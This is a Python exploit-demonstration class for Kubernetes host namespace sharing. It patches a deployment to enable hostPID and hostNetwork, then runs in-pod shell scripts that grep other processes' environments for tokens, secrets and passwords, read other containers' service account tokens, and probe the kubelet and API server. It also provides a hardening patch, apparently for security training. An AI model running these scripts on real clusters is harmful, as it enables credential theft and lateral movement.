from typing import Dict, List

from .base import BaseExploit, ExploitResult


class HostNamespaceSharingExploit(BaseExploit):
    """Exploit for host namespace sharing misconfiguration."""

    name = "Host Namespace Sharing"
    risk_level = "CRITICAL"
    vulnerability_type = "host-namespace-sharing"
    description = """This exploit demonstrates the risks of sharing host namespaces:

                - hostPID: Access to ALL host processes
                - hostNetwork: Access to host network interfaces
                - hostIPC: Access to host IPC resources

                With host namespace access, container isolation is severely
                compromised, enabling:
                - Lateral movement across containers
                - Access to sensitive process information
                - Network traffic interception
                - Secrets exposure from other containers"""

    def get_default_service(self) -> str:
        return "unguard-frontend"

    def get_vulnerable_patch(self) -> List[Dict]:
        return [
            {"op": "add", "path": "/spec/template/spec/hostPID", "value": True},
            {"op": "add", "path": "/spec/template/spec/hostNetwork", "value": True},
        ]

    def get_secure_patch(self) -> List[Dict]:
        return [
            {"op": "replace", "path": "/spec/template/spec/hostPID", "value": False},
            {
                "op": "replace",
                "path": "/spec/template/spec/hostNetwork",
                "value": False,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext",
                "value": {},
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/runAsNonRoot",
                "value": True,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/runAsUser",
                "value": 1000,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/allowPrivilegeEscalation",
                "value": False,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/capabilities",
                "value": {"drop": ["ALL"], "add": ["NET_BIND_SERVICE"]},
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/resources",
                "value": {
                    "limits": {"memory": "512Mi", "cpu": "300m"},
                    "requests": {"memory": "256Mi", "cpu": "150m"},
                },
            },
        ]

    def check_vulnerability(self) -> bool:
        """Check if service has host namespace access."""
        pod_name = self.k8s.find_pod_for_service(self.service)
        if not pod_name:
            return False

        try:
            pod = self.k8s.v1.read_namespaced_pod(pod_name, self.k8s.namespace)

            # Check host namespace settings
            if pod.spec.host_pid or pod.spec.host_network or pod.spec.host_ipc:  # type: ignore[attr-defined]
                return True

            return False

        except Exception:
            return False

    def demonstrate(self) -> ExploitResult:
        """Demonstrate host namespace access risks."""
        self.logger.exploit("Demonstrating host namespace access risks...")

        pod_name = self.k8s.find_pod_for_service(self.service)
        if not pod_name:
            return ExploitResult(
                success=False,
                message="Pod not found for service",
            )

        evidence = []
        impact = []

        # Test 1: Host PID namespace access
        self.logger.exploit("Test 1: Host PID namespace access (hostPID)")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Testing host namespace access..."
                
                echo -e "\\n[Test 1] Checking PID namespace:"
                if [ -f /proc/1/sched ]; then
                    init_name=$(cat /proc/1/sched 2>/dev/null | head -1 | awk '{print $1}' || echo "unknown")
                    if echo "$init_name" | grep -qE "systemd|init"; then
                        echo "❌ VULNERABLE: Using host PID namespace (hostPID=true)!"
                        echo "[PROOF] Init process is: $init_name"
                    else
                        echo "✅ Protected: Isolated PID namespace"
                    fi
                fi
                
                total_procs=$(ls /proc 2>/dev/null | grep -E "^[0-9]+$" | wc -l || echo "0")
                echo "[*] Total processes visible: $total_procs"
                
                if [ "$total_procs" -gt 50 ]; then
                    echo "❌ VULNERABLE: Can see host processes!"
                    echo ""
                    echo "[PROOF] Critical host processes visible:"
                    
                    for proc in sshd kubelet dockerd containerd systemd-resolved; do
                        if pgrep -x "$proc" >/dev/null 2>&1; then
                            pid=$(pgrep -x "$proc" | head -1)
                            echo "  - PID $pid: $proc"
                            if [ -r "/proc/$pid/cmdline" ]; then
                                cmdline=$(tr "\\0" " " < "/proc/$pid/cmdline" | cut -c1-80)
                                echo "    CMD: $cmdline..."
                            fi
                        fi
                    done
                    
                    echo ""
                    echo "[*] Can read environment variables from other processes:"
                    for pid in $(ls /proc | grep -E "^[0-9]+$" | head -20); do
                        if [ -r "/proc/$pid/environ" ] && grep -q "KUBERNETES\\|DOCKER" "/proc/$pid/environ" 2>/dev/null; then
                            echo "❌ CRITICAL: Can read environment from PID $pid!"
                            cat "/proc/$pid/environ" 2>/dev/null | tr "\\0" "\\n" | grep -E "TOKEN|SECRET|PASSWORD|KEY" | head -2 || true
                            break
                        fi
                    done
                else
                    echo "✅ Protected: Limited process visibility"
                fi
            """,
            )

            print(result)

            if "Using host PID namespace" in result:
                evidence.append("Host PID namespace access confirmed (hostPID=true)")
                impact.append("Can see and interact with ALL host processes")

            if "Can read environment from PID" in result:
                evidence.append("Can read environment variables from host processes")
                impact.append("Potential exposure of secrets and tokens")

        except Exception as e:
            self.logger.error(f"Test 1 failed: {e}")

        # Test 2: Host network namespace access
        self.logger.exploit("Test 2: Host network namespace access (hostNetwork)")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Testing network namespace isolation..."
                
                echo -e "\\n[Test 2] Checking network namespace:"
                iface_count=$(ip link show 2>/dev/null | grep "^[0-9]" | wc -l || echo "0")
                echo "[*] Network interfaces visible: $iface_count"
                
                if [ "$iface_count" -gt 5 ]; then
                    echo "❌ VULNERABLE: Using host network namespace (hostNetwork=true)!"
                    echo ""
                    echo "[PROOF] Host network interfaces visible:"
                    ip addr show 2>/dev/null | grep -A2 "^[0-9]" | grep -E "inet |link/ether" | head -10
                    
                    echo ""
                    echo "[*] Can see ALL network connections:"
                    echo "[STATS] Total network connections:"
                    netstat -tun 2>/dev/null | tail -n +3 | wc -l || ss -tun | tail -n +2 | wc -l || echo "  Cannot count"
                    
                    echo ""
                    echo "[*] Can see Kubernetes API on localhost:"
                    if nc -zv localhost 6443 2>&1 | grep -q succeeded || \\
                       curl -sk https://localhost:6443/version 2>/dev/null | grep -q gitVersion; then
                        echo "❌ CRITICAL: Can access Kubernetes API on localhost:6443!"
                    fi
                    
                    echo ""
                    echo "[*] Can see kubelet on localhost:"
                    if curl -sk https://localhost:10250/pods 2>/dev/null | grep -q "Unauthorized"; then
                        echo "❌ VULNERABLE: Kubelet API accessible on localhost:10250!"
                    fi
                else
                    echo "✅ Protected: Isolated network namespace"
                fi
            """,
            )

            print(result)

            if "Using host network namespace" in result:
                evidence.append(
                    "Host network namespace access confirmed (hostNetwork=true)"
                )
                impact.append("Can see ALL network traffic on the host")

            if "Can access Kubernetes API" in result:
                evidence.append("Direct access to Kubernetes API via localhost")
                impact.append("Can potentially control the entire cluster")

        except Exception as e:
            self.logger.error(f"Test 2 failed: {e}")

        # Test 3: Container-to-container visibility
        self.logger.exploit("Test 3: Container-to-container visibility")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Looking for other containers..."
                
                echo -e "\\n[*] Searching for other container processes:"
                other_containers=0
                
                for pattern in "java.*unguard" "node.*unguard" "python.*unguard" "nginx.*unguard"; do
                    if ps aux 2>/dev/null | grep -E "$pattern" | grep -v grep >/dev/null; then
                        echo "❌ VULNERABLE: Found other container processes matching: $pattern"
                        ps aux 2>/dev/null | grep -E "$pattern" | grep -v grep | head -2
                        ((other_containers++))
                    fi
                done
                
                for svc in payment profile membership user-auth ad-service; do
                    if ps aux 2>/dev/null | grep -i "$svc" | grep -v grep | grep -v "^root" >/dev/null; then
                        echo "❌ VULNERABLE: Can see $svc service process!"
                        ((other_containers++))
                    fi
                done
                
                if [ "$other_containers" -eq 0 ]; then
                    echo "✅ Protected: Cannot see other container processes"
                else
                    echo ""
                    echo "[IMPACT] With access to other container processes, attacker can:"
                    echo "  • Read memory maps and extract secrets"
                    echo "  • Kill or manipulate other services"
                    echo "  • Steal service account tokens"
                fi
            """,
            )

            print(result)

            if "Found other container processes" in result:
                evidence.append("Can see processes from other containers")
                impact.append("Can interact with and compromise other services")

        except Exception as e:
            self.logger.error(f"Test 3 failed: {e}")

        # Test 4: Sensitive file and token access
        self.logger.exploit("Test 4: Sensitive file and token access")
        try:
            sensitive_paths = [
                "/host/etc/shadow",
                "/host/root/.ssh",
                "/host/var/lib/kubelet/config.yaml",
            ]

            result = self.k8s.exec_in_pod(
                pod_name,
                f"""
                echo "[*] Checking access to sensitive locations..."
                
                host_access=0
                
                for path in {str(sensitive_paths)}; do
                    if [ -e "$path" ]; then
                        echo "❌ CRITICAL: Can access $path"
                        ((host_access++))
                    fi
                done
                
                echo -e "\\n[*] Looking for service account tokens from other containers..."
                token_count=0
                
                for pid in $(ls /proc 2>/dev/null | grep -E "^[0-9]+$" | head -50); do
                    token_path="/proc/$pid/root/var/run/secrets/kubernetes.io/serviceaccount/token"
                    if [ -f "$token_path" ] && [ -r "$token_path" ]; then
                        if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
                            our_token=$(head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "none")
                            their_token=$(head -c 50 "$token_path" 2>/dev/null || echo "none")
                            if [ "$our_token" != "$their_token" ]; then
                                echo "❌ CRITICAL: Found service account token from PID $pid!"
                                echo "[PROOF] Token starts with: $(head -c 30 "$token_path" 2>/dev/null)..."
                                ((token_count++))
                                if [ $token_count -ge 2 ]; then
                                    break
                                fi
                            fi
                        fi
                    fi
                done
                
                if [ "$token_count" -gt 0 ]; then
                    echo "[IMPACT] Stolen tokens can be used to:"
                    echo "  • Impersonate other services"
                    echo "  • Access Kubernetes API with different permissions"
                    echo "  • Pivot to different namespaces"
                else
                    echo "✅ Protected: Cannot access other container tokens"
                fi
            """,
            )

            print(result)

            if "Found service account token" in result:
                evidence.append(
                    "Can steal service account tokens from other containers"
                )
                impact.append("Can impersonate other services and escalate privileges")

        except Exception as e:
            self.logger.error(f"Test 4 failed: {e}")

        # Test 5: IPC and shared memory access
        self.logger.exploit("Test 5: IPC and shared memory access")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Checking IPC namespace isolation..."
                
                if command -v ipcs >/dev/null 2>&1; then
                    shm_count=$(ipcs -m 2>/dev/null | grep -E "^0x" | wc -l || echo "0")
                    if [ "$shm_count" -gt 0 ]; then
                        echo "❌ VULNERABLE: Can see shared memory segments!"
                        echo "[PROOF] Shared memory segments visible:"
                        ipcs -m 2>/dev/null | head -5
                    else
                        echo "✅ Protected: No shared memory segments visible"
                    fi
                else
                    echo "[!] ipcs command not available"
                fi
                
                if [ -d /dev/shm ]; then
                    shm_files=$(ls -la /dev/shm 2>/dev/null | grep -v "^total" | wc -l || echo "0")
                    if [ "$shm_files" -gt 1 ]; then
                        echo "❌ VULNERABLE: Shared memory files visible in /dev/shm!"
                        ls -la /dev/shm | head -5
                    fi
                fi
            """,
            )

            print(result)

            if "Can see shared memory segments" in result:
                evidence.append("IPC namespace sharing detected")
                impact.append("Can access shared memory from other processes")

            if "[!] ipcs command not available" in result:
                evidence.append(
                    "IPC tools unavailable, but shared memory access still possible"
                )

        except Exception as e:
            self.logger.error(f"Test 5 failed: {e}")

        # Summary
        self.logger.exploit("=== Impact Summary ===")
        summary_impact = [
            "View and kill ANY process on the host (hostPID)",
            "Access network traffic from all containers (hostNetwork)",
            "Steal credentials from other containers",
            "Perform lateral movement across the node",
            "Access local services (kubelet, docker, etc.)",
            "Intercept inter-pod communications",
            "Potentially escape to the host system",
        ]

        for item in summary_impact:
            print(f"  • {item}")

        return ExploitResult(
            success=bool(evidence),
            message="Host namespace sharing exploit demonstrated",
            evidence=evidence,
            impact=impact + summary_impact,
        )
